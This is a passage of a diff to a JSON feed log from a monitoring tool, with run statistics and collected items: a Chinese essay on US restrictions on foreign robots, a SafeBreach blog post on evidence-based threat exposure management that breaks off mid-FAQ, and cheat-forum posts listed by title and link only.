-      "content": "产业与竞争\n宏观与地缘\n安全与供应链\n2026年7月底，美国联邦通信委员会更新了\nCovered\nList\n，同步发布了\nDA-26-786\n通告\n和\nFCC Fact\nSheet\n，把外国生产的先进机器人设备正式列了进去。按照配套的\nRobotics\nNational Security Determination\n认定和\n47 CFR\n§2.903\n的规定，只要是符合条件的新型号，后续就很难拿到无线设备授权，没法在美国进口或销售了。消息一出，圈子里讨论得很热闹，很多人第一反应是觉得美国终于要对外国人形机器人下重手了。但如果仔细翻一下具体的文件条款，会发现受限的范围远不只是几万美元的昂贵人形机器，而是直接划了一条很宽的技术线：重量超过4.4磅、装有传感器、跑着自主导航软件，而且网络连接速度超过200kbps的地面移动设备全都在里面。正如\nCovington\n独立法律分析\n提醒的那样，这意味着从工厂里的自主搬运车，到家庭用的割草机器人和泳池清洗机，只要是外国生产的新型号，都会碰上这道许可门槛。\n面对这项新规，坊间迅速形成了两种截然相反却同样片面的叙事。一种声音认为，中国当年搞白名单和产业补贴非常成功，培育出了一批全球巨头，美国现在不过是学中国而已，以子之矛攻子之盾，理所当然；另一种声音则认为，美国现在搞设备禁令完全是闭关锁国，如同晚清自封，是产业衰落和竞争退步的前兆。这两种看法的共同问题在于，把复杂的产业经济学硬套进了非黑即白的二元情绪框架里。无论是全盘神化保护主义，还是简单将其扣上闭关锁国的帽子，都无法解释真实商业世界中的纷繁现象。\n要评估一项保护政策到底能换来战略安全，还是会变成搬起石头砸自己的脚，不能靠情绪化的标签，而是要具体问题具体分析。首要的切入点，是看被限制的产品究竟处于产业链的什么位置——它到底属于终端消费品，还是生产工具？如果是服装、鞋帽或者普通家电被加了关税，买单的主要是终端消费者，大家要么多花点钱，要么换个牌子，这种成本主要停留在消费环节，对整体生产力的传导相对局部。但机械臂、算力芯片、高精度传感器和移动机器人完全不一样，它们不是买回家享乐的消费品，而是工厂、实验室、物流仓和农场用来干活、降成本、搞研发的生产工具。给消费品设限影响的是生活成本，给生产工具设限传递的则是生产力成本。\n一旦给生产工具设限，成本就不会停在买卖的那一刹那，而是会顺着整个生产和研发链条一路传导放大。如果某种生产工具在本土一时半会儿找不到性价比相当的替代品，一刀切的限制就会迫使本土企业去买更贵、性能差一截或者交期拖很久的备选项。对准备做自动化改造的工厂来说，这意味着装配线的投入成本陡增；对做具身智能研究的实验室来说，这意味着同样的预算下能买到、能用来做实验的机器人少了一大半。当干活的工具变贵、变少，本土企业的生产力改进就会慢下来，这种成本抬升最终会削弱本土下游产品在国际上的竞争力，原本想保护本土产业，结果反而损害了本土的生产效率。\n三种技术限制的成本传导拓扑\n三种不同的技术拓扑\n如果我们带着这个视角，去重新审视这几年全球范围内几个经典的限制案例，会发现相当有意思的对应关系。中国在稀土冶炼与加工上掌握着产能控制，美国试图通过加征关税强推稀土供应链回流；美国在芯片设计与制造设备上实施出口控制，中国则加快本土算力替代；中国当年通过补贴和目录限制外国电池共享优惠，美国现在则限制外国机器人进入本土市场。如果把这些案例放在同一个坐标系里观察，它们表面上都是政策干预，但背后的底层结构真的一样吗？答案显然是否定的，因为它们的成本和技术结构其实代表了三种完全不同的形态。\n芯片能防住，是因为源头卡在极少数公司手里\n芯片领域的技术壁垒，高度集中在 EDA 软件、核心 GPU\n架构设计以及少数几家制造设备厂商手里。整个产业链呈现出资本和技术极度密集的特征，源头控制点在物理和企业维度上都非常集中。在这种情况下，掌握源头瓶颈的一方如果实施管制，确实能在短时间内给对手带来直接的算力阻断。因为芯片设计和制造的门槛实在太高，建一条替代供应链需要好多年和巨大的资金投入，所以在这个领域，防守型限制容易在特定时间窗口内看到明确的阻断效果。\n美国对稀土加关税，往往是本国制造业在买单\n稀土和关键矿产的情况刚好相反。美国曾试图通过 301\n条款对中国生产的稀土永磁体加征高达25%的关税，本意是逼迫本土企业减少对中国稀土零部件的依赖，拉动供应链去风险。然而，稀土真正的瓶颈从来不是地下的矿石，而是选矿之后的冶炼分离、高纯度提炼和高级磁体材料的加工工艺。这是一个高度依赖环保成本、长期工艺经验积累和化工调试的产业链。由于美国本土缺乏成熟且有成本优势的冶炼工厂与磁体制造能力，光靠加征关税，不可能在短时间内凭空拔起几座化工和冶炼设施。\n这种情况下强行加征关税，关税和断供的成本只能由美国本国的下游制造业来硬扛。无论是电动汽车厂购买电机组件，还是国防工业采购隐身战机所需的关键构件，都不得不支付更高的原材料关税溢价。关税政策非但没能在短时间内建立起本土的稀土自主体系，反而成了美国本国高端制造业的额外经济负担。\n机器人最怕禁硬件，因为这会断掉算法的数据流\n机器人和具身智能则代表了第三种更为特殊的结构。它的技术演化同时依赖两件事：一是物理硬件的制造集群，二是真实场景里的部署数据。硬件层面，伺服电机、减速器、滚珠丝杠和传感器，高度依赖庞大的制造集群和规模化量产来把成本压下来；软件层面，具身智能模型的训练，高度依赖设备在真实环境里的海量交互数据。无论是导航避障还是机械臂抓取，都需要设备在成千上万个真实场景里跑上万个小时。这种双重依赖形成了一个明确的逻辑：有规模才有低成本硬件，硬件便宜了才能大规模部署，大规模部署才能拿到海量数据，而数据又能反过来让算法模型越跑越聪明。\n如果外国厂商在北美之外的市场依然占着很大份额，它们就能继续靠全球市场摊薄硬件成本，靠海量的真实场景数据迭代算法。这时候如果硬生生封锁本国市场，而本土又拿不出性价比相当的替代硬件，结果就是本土企业买工具的成本被推高，能在真实场景里跑起来的设备大幅减少。数据闭环一旦变窄，本土模型迭代的速度就可能落后于全球主流水平，最后不仅没有缩小差距，反而在累计产量和算法演化上被拉得更远。\n正向扶持 vs\n负向封锁：工具方向反转\n正向扶持与负向封锁完全是两码事\n看清这三种拓扑之后，我们就能进一步理解为什么不能简单照搬历史上的产业政策经验。大家讨论产业政策时，经常拿中国当年电池白名单的经验来举例，觉得当年靠阶段性保护培育出了一批全球电池巨头，今天设限也能起到类似的效果。但如果仔细看当时具体是怎么跑通的，就会发现它和今天的防守型禁令走的是两条完全相反的路径。\n当年电池白名单政策能起作用，靠的是三个关键的前提：第一，本土本身就有巨大的消费和商业应用市场，能消化掉早期成本偏高、性能还没那么完美的产品；第二，本土拥有成本极低、效率极高的制造供应链，能快速把规模效应做出来；第三，整个过程中始终保持对全球技术、资本和零部件供应链的开放吸收，本土企业是在融入全球分工的过程中把技术磨出来的。现在的防守型限制主要靠出口管制、\nCovered List\n审查和关税，它的动作是把外国供给排斥在外，而不是直接提升本国工厂的生产效率。如果一个国家在某种硬件上本身就面临制造成本高、零部件供应链不全的客观条件，单靠把外国高性价比产品挡在门外，并不会自动变出有竞争力的本土替代品。按\n47\nCFR §2.939\n的规定，后续即使开启单独撤销程序，封锁争取的所谓学习时间，也大概率会变成下游企业不得不承担的高额成本，甚至让本土技术路线脱离全球主流生态。\n零信任软件审计才是更理性的路\n把这几种硬科技的成本和技术结构捋清楚之后，思路就会变得清晰：在机器人和具身智能领域，光靠按生产地一刀切禁硬件，并不是兼顾安全和产业竞争力的好办法。在国防、关键基础设施和敏感部门，对进场设备搞严格的原产地审查完全合理；但如果把这种按地理生产地划线的做法扩大到常规工业、仓储物流甚至家用领域，带来的经济副作用会远大于安全收益。智能化硬件带来的网络安全、数据隐私和远程控制担忧是真实的，但解开这个结的办法，应当是实现硬件躯干和数据通路的解耦，也就是从工业时代的排斥硬件，转向数字时代的零信任软件与数据审计。\n一台设备到底安不安全，关键看它跑的固件透不透明、数据发往哪里、模型权重有没有留后门，而不是只看它的车轮或机械臂是在哪个工厂组装的。如果一家外国设备厂商愿意接受完整的软件物料清单审查，把数据存储和边缘计算节点放在本土监管框架下，并提供随时可被审查的固件更新机制，就没有必要仅仅因为制造地点而把它拒之门外。建立这种透明、可验证、可撤销的软件与数据安全认证体系，既能把潜在的安全风险防住，又能让本土的工厂、物流和科研机构继续享受全球低成本硬件带来的效率红利。评估任何科技保护政策，核心是看清楚不同产品的物理与经济属性。只有当本土拥有足够的制造供给弹性、技术还在快速学习期，而且政策留有明确成本控制和退场机制时，保护才可能变成优势。反之，如果在生产工具领域盲目扩大封锁，保护主义的刀刃最后往往会切伤自己产业走向智能化的脚步。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
-      "content_chars": 3771,
-      "content_sha256": "136505444f8f5ac562bcd593401646d8e7c724f6a4320034145f1d5ae9078bca",
-      "content_fetched_at": "2026-08-03T22:14:08.447730+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    }
-  ],
-  "summary": {
+  "source_id": "blog_watch",
+  "collect_date": "2026-08-04",
+  "collect_window": {
+    "start": "2026-08-02T00:00:00+00:00",
+    "end": "2026-08-03T22:12:48.983315+00:00",
+    "hours": 46
+  },
+  "producer": {
+    "name": "sentinel-site",
+    "version": "0.1.0",
+    "run_id": "30857771239",
+    "commit": "cad4517"
+  },
+  "stats": {
+    "total": 8,
     "by_kind": {
       "publish": 8
     },
@@ -224,9 +30,646 @@
       "denizhalil-blogs": 1,
       "yage-share": 2
     },
+    "failed_lists": [],
+    "sources_ok": 51,
+    "sources_failed": [],
+    "baselines": 0,
+    "via_sources": {
+      "llm": 11,
+      "browser_llm": 9,
+      "rss": 31
+    },
+    "llm_usage": {
+      "model": "deepseek-v4-flash",
+      "requests": 13,
+      "calls": 13,
+      "prompt_tokens": 14733,
+      "completion_tokens": 4446,
+      "total_tokens": 19179,
+      "prompt_cache_hit_tokens": 10752,
+      "prompt_cache_miss_tokens": 3981
+    },
     "by_content_status": {
       "failed": 3,
       "ok": 5
     }
-  }
+  },
+  "items": [
+    {
+      "id": "a:1b9b48d180763724",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
+      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
+      "at": "2026-08-03T22:12:48.983315+00:00",
+      "external_id": "a:1b9b48d180763724",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
+      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
+      "content": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-08-03T22:13:37.488531+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-08-03T22:12:48.983315+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:bffdf197aff89dc5",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "NtLdr - WindowsNT Injector",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
+      "text": "unknowncheats-ac published: NtLdr - WindowsNT Injector",
+      "at": "2026-08-03T22:12:48.983315+00:00",
+      "external_id": "a:bffdf197aff89dc5",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
+      "title": "NtLdr - WindowsNT Injector",
+      "content": "unknowncheats-ac published: NtLdr - WindowsNT Injector",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-08-03T22:13:48.369757+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-08-03T22:12:48.983315+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "NtLdr - WindowsNT Injector",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:973cfcec318dd421",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
+      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
+      "at": "2026-08-03T22:12:48.983315+00:00",
+      "external_id": "a:973cfcec318dd421",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
+      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
+      "content": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-08-03T22:13:59.255736+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-08-03T22:12:48.983315+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:0aaaa2450e2b8bb8",
+      "who": "safebreach-blog",
+      "who_url": "https://www.safebreach.com/blog/",
+      "action": "publish",
+      "target": "Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
+      "target_url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
+      "text": "safebreach-blog published: Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
+      "at": "2026-08-03T22:12:48.983315+00:00",
+      "external_id": "a:0aaaa2450e2b8bb8",
+      "url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
+      "title": "Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
+      "content": "Aug 3, 2026\nCTEM Has a Silent E—and It Stands for Evidence\nRegulators worldwide are done accepting attestation and now demand evidence. Learn what CISOs need to prove their controls actually work—and how to build the habit now.\nSummary\nRegulators worldwide—DORA, NIS2, the SEC, NYDFS, PCI DSS 4.0, and the EU AI Act—are shifting from attestation (‘we have controls’) to evidence (‘we can prove they work’). For CISOs, that means Continuous Threat Exposure Management (CTEM) only satisfies auditors and boards when its validation stage produces timestamped, reproducible proof of what was tested, what fired, and what got fixed. Hear SafeBreach cybersecurity expert Adrian Culley break down why organizations that build the evidence habit early will lead the way.\nAuthor:\nAdrian Culley, Offensive Security Expert & Senior Sales Engineer\nI want to begin with a spelling correction, which is not something I ever expected to make in a security article. We have all spent years talking about\nContinuous Threat Exposure Management\n(CTEM), Gartner’s five-stage framework. C-T-E-M. And I have come to believe we have been spelling it wrong the whole time.\nCTEM has a silent E on the end. It is really CTEME, and the silent E stands for Evidence. It is, I would argue, the only silent letter in the English language that regulators can hear perfectly well.\nLet me be clear about what I am and am not saying. Gartner’s CTEM is still five stages—scoping, discovery, prioritization, validation, and mobilization—and I am not rewriting the framework. My point is narrower and, I think, more urgent: the whole cycle only means something if it ends in evidence. Scoping, discovery, prioritization—these produce plans and lists. Validation is where something different happens. If validation ends with a dashboard someone glances at, you have performed an exercise. If it ends with a timestamped, reproducible record of what was tested, what fired, what didn’t, and what you fixed, you have produced evidence. And evidence is rapidly becoming the currency of cyber regulation worldwide.\nThe End of the Attestation Era\nThere was nothing wrong with the old model—ten years ago. That was the era of attestation. You attested that you had a firewall, endpoint protection, an annual penetration test, and everyone around the table nodded. The trouble is that attestation answers the question “do you have controls?”—and the question regulators are now asking is “do your controls work?”\nThose are completely different questions, and our industry has spent two decades answering the first, while breaches kept demonstrating that the second was going unanswered. Read almost any major breach post-mortem and you will find the same paragraph: the victim had a SIEM, had an EDR, had a program that looked mature on paper. The controls existed. They simply didn’t do their job on the day.\nMeanwhile the discovery side of the house has become almost too good. Scanners, cloud posture tools, attack surface management—most enterprises can generate ten thousand findings before lunch. Which is precisely why I keep saying that exposure data without validation is just a longer to-do list. The discovery machinery is superb now. What it cannot tell you is whether any of it matters against a real adversary, because that requires actually behaving like one. Execute the technique. Take T1003.001—credential dumping from LSASS memory. Did the EDR block it? Did the SIEM rule fire? Did the SOC see it inside their target window? Once you have run it, you don’t merely know the answer. You can prove you know it. That is the whole distinction.\nFollow the Receipts\nThe claim that regulators worldwide are converging on evidence is a large one, so let me walk through the receipts.\nStart with DORA, the EU’s\nDigital Operational Resilience Act\n—Regulation 2022/2554, applying to financial entities since January 2025. DORA does not ask banks to attest to resilience. Chapter four mandates a digital operational resilience testing program, and for designated significant entities, Article 26 requires threat-led penetration testing at least every three years, against live production systems, with findings and remediation plans going back to the authorities. That is an evidence pipeline written into law. The mechanics come from\nTIBER-EU\n, the European Central Bank’s threat-led testing framework, whose entire design is that the test mimics real threat actors based on real intelligence and produces a documented result a supervisor can inspect. That is evidence with a threat model attached.\nThen look at\nNIS2\n—Directive 2022/2555, which broadened all of this well beyond finance to essential and important entities across eighteen sectors. Article 21 lists the mandatory risk-management measures, and buried in that list is my favorite clause in modern cyber regulation: entities must have policies and procedures to\nassess the effectiveness\nof their cybersecurity risk-management measures. Not “have measures”—assess whether the measures work. That is the silent E written into a European directive. And NIS2 pairs it with Article 20, which places accountability on management bodies personally. Board members’ questions changed overnight: no longer “do we have a security program?” but “can someone show me the evidence that it works, because my name is on it?”\nCross the Channel and the UK is plainly not sitting this out. The Cyber Security and Resilience Bill is working its way through Parliament, and UK financial services have arguably been ahead of everyone—the FCA and PRA operational resilience regime requires firms to set impact tolerances and\nevidence\n, through scenario testing, that they can stay within them, holding a written self-assessment the regulator can demand at any time. The deadline to demonstrate that passed in March 2025, and new operational incident reporting duties now run the evidence demand in both directions: prove in advance that you are resilient, and document in detail when you weren’t.\nCross the Atlantic, and you’ll see this is not just a European habit. The\nSEC’s cybersecurity disclosure rules\n, in force since December 2023, require public companies to disclose material incidents on Form 8-K, Item 1.05, within four business days, and to describe annually, under Regulation S-K Item 106, how they assess and manage cyber risk. If your 10-K says you validate your defences and an incident later shows you never did, that is not embarrassment—that is potential securities liability. New York has gone further still: NYDFS Part 500, as amended in November 2023, requires an annual certification of material compliance, signed by the CISO and the highest-ranking executive. No rational CISO signs that on vibes. You sign it because you hold test results, validation records, and documented remediation. And the payments world worked this out years ago—\nPCI DSS 4.0\n, Requirement 11, insists you demonstrate controls operate continuously, because a point-in-time audit only tells you about one Tuesday. The newest arrival, the EU AI Act, bites for high-risk systems on August 2, 2026, with Article 12 mandating automatic logging and Article 11 mandating technical documentation. A different domain, an identical philosophy: the regulator does not want your assurance, the regulator wants your records.\nRegulations Requiring Evidence, Not Attestation\nRegulation\nJurisdiction\nEvidence requirement\nStatus\nDORA (Reg 2022/2554)\nEU financial entities\nArticle 26: threat-led penetration testing at least every 3 years for significant entities, against live systems\nIn force since Jan 2025\nNIS2 (Directive 2022/2555)\nEU, 18 essential/important sectors\nArticle 21: must assess effectiveness of risk measures, not just have them; Article 20 puts personal accountability on management\nTransposing across member states\nUK operational resilience (FCA/PRA)\n+\nCyber Security and Resilience Bill\nUK financial services & beyond\nMust evidence, via scenario testing, that impact tolerances hold; written self-assessment on demand\nSelf-assessment deadline passed March 2025; bill in Parliament\nSEC cybersecurity disclosure rules\nUS public companies\nForm 8-K Item 1.05 (4-day incident disclosure); Reg S-K Item 106 (annual risk-management description)\nIn force since Dec 2023\nNYDFS\nPart 500\nNY-regulated financial entities\nAnnual certification of material compliance, signed by CISO and top executive\nAmended Nov 2023\nPCI DSS 4.0\nGlobal payments\nRequirement 11: demonstrate controls operate continuously, not just at audit time\nCurrent\nEU AI Act\nEU, high-risk AI systems\nArticle 12 automatic logging; Article 11 technical documentation\nEnforcement Aug 2, 2026 (EC has proposed pushing some deadlines to 2027—not yet law)\nPaperwork is Not Evidence\nAt this point a fair objection arrives: “we already produce mountains of compliance paperwork—surely that is evidence?” It is not, and the difference is what generated it. Compliance paperwork is largely self-description—humans writing down what they believe the environment does. Evidence, in the sense the silent E means it, is machine-generated ground truth: an attack technique executed at a given timestamp, against a given control, with an exact record of what happened.\nIt has three properties paperwork lacks. It is\nempirical\n—produced by execution, not opinion. It is\nreproducible\n—run the same technique next quarter and compare. And it is\nspecific\n—mapped to something real, like a MITRE ATT&CK technique ID, rather than a vague control objective. A policy document ages the moment it is printed. Evidence carries a timestamp and invites you to refresh it.\nOne Dataset, Two Audiences\nThis is where the economics change, and where I would ask executives to pay close attention. Boards have historically filed security validation under technical hygiene. What I am describing is validation as regulatory work-product: the same execution evidence that tunes a detection rule on Monday answers a supervisor’s effectiveness question on Friday. One dataset, two audiences. It lets the CISO sign the NYDFS certification, lets the board discharge its NIS2 duty, backs the 10-K language, feeds the DORA testing file—and, incidentally, satisfies the cyber insurer, who is asking the same effectiveness questions the regulators are, only with premiums attached instead of fines.\nThis is what we do at\nSafeBreach\n:\nadversarial exposure validation (AEV)\n. And the pattern I see under DORA and NIS2 is consistent: validation reports have stopped being an internal SOC artifact and started going upstairs. Once you see that evidence as a reusable asset rather than a report that dies in a shared drive, you are no longer paying for a test. You are building a continuously refreshed body of proof that half a dozen stakeholders already demand.\nWhat to Look For\nIf you accept the silent E and want to build the evidence habit, here is what separates genuine capability from a marketing label. Look for\nreal execution\n—the approach must run the technique against live controls, not map assets to a threat feed and infer, because inference is not evidence. Look for\nframework alignment\n, with results tied to\nMITRE ATT&CK IDs\n, so the evidence speaks a language auditors, regulators and red teams share. Look for\nreproducibility and trend\n—can you run the same scenario quarterly and show the delta? Regulators love a trend line; it proves the programme is alive. Look for\nexportability\n, because evidence locked inside a tool is evidence you cannot hand to a supervisor. And add a governance test of your own: chain of custody in the loose sense—who ran the test, when, against what scope, with what result and what remediation. If the evidence cannot answer those questions, a regulator will treat it the way a court treats hearsay. A brilliant penetration test with a PDF nobody can reconcile to scope six months later is craft without evidence. The discipline matters as much as the execution.\nThe Direction of Travel\nIs the silent E a European fashion, or the permanent direction of travel? Permanent and accelerating. DORA in force, NIS2 transposing across member states, the UK bill in Parliament, the SEC regime maturing through enforcement, NYDFS certifications cycling annually, the AI Act’s logging obligations arriving in weeks—every new instrument, in every jurisdiction, moves the same way: from attestation to demonstration.\nMy prediction is straightforward. Within a couple of years, “show me your validation evidence” will be as routine an opening question in a supervisory review as “show me your asset inventory” is today. The organizations that built the evidence habit early will find those conversations short and boring—which is exactly what you want a regulatory conversation to be.\nSo, spell it however you like. Just make sure the last letter of your exposure management program is proof, not a promise.\nTo see how the\nSafeBreach CTEM Platform\nis helping some of the world’s largest enterprise security teams operationalize CTEM, validate real-world risk, and drive continuous, measurable risk reduction,\nrequest a customized demo\ntoday.\nAbout the Author\nAdrian Culley\nis Head of Engineering, EMEA for SafeBreach. He has over 35 years of Computer Security experience, particularly specialising in Security Operations, Artificial Intelligence, Offensive Security, Threat Intelligence and Malware: in short Cyber Resilience. He is a core member of the OWASP Large Language Model Top Ten risks working Group.\nHe is a graduate of the Information Security Group at Royal Holloway, University of London, and an occasional visiting lecturer there. Adrian was previously a Detective with Scotland Yard, working around the world with their Special Operations Directorate, and latterly served with the Computer Crime Unit there. He has also worked directly for the UK Central Government in a global role. He worked for Palo Alto Networks for 5 years as a Consulting Engineer and Head of Industry 4.0. Previously he has also worked for PWC, Trellix, Cybereason, Guidance Software, AccessData and Damballa. Adrian has a strong background in Digital Forensics and has worked with Government, NGO, military, intelligence, law enforcement, and commercial clients around the world.\nFrequently Asked Questions\nCTEM Evidence & Regulatory Validation\nWhat is CTEM evidence, and how is it different from compliance attestation?\nAttestation is a self-description—a written claim that a control exists. Evidence is machine-generated ground truth: an attack technique executed at a specific timestamp against a specific control, with a documented record of what happened. CTEM’s validation stage is only doing its job if it produces the latter.\nWhich regulations now require security control validation evidence, not just a written policy?\nDORA (Article 26) mandates threat-led penetration testing against live systems for significant EU financial entities. NIS2 (Article 21) requires entities to assess the effectiveness of their risk measures, not just have them. The SEC requires public companies to disclose material incidents within four business days and describe their risk management annually. NYDFS Part 500 requires an annual certification signed by the CISO and a top executive. PCI DSS 4.0 (Requirement 11) requires proof that controls operate continuously. And the EU AI Act (Articles 11 and 12) mandates technical documentation and automatic logging for high-risk systems.\nHow does adversarial exposure validation (AEV) generate regulatory evidence?\nAEV executes real adversary techniques—mapped to MITRE ATT&CK IDs—against live production controls and records exactly what happened: whether the control blocked it, whether the SIEM alerted, whether the SOC caught it in time. That output is empirical, reproducible, and specific, which is precisely what regulators are asking for when they say “prove your controls work.”\nDoes DORA require 